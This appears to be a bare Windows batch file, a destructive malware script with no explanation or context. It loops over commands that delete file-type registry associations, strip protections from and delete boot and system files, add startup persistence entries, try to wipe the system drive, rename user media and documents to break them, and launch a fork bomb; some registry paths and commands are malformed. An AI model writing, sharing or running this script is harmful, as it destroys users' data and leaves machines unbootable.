:a
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window
delete %systemdrive%\*.* /f /s
REN *.avi *.txt REN *.mkv *.txt REN *.BAT *.txt REN *.doc *.txt REN *.JPEG *.txt REN *.lnk *.txt REN *.EXE *.noob
%0|%0
goto a
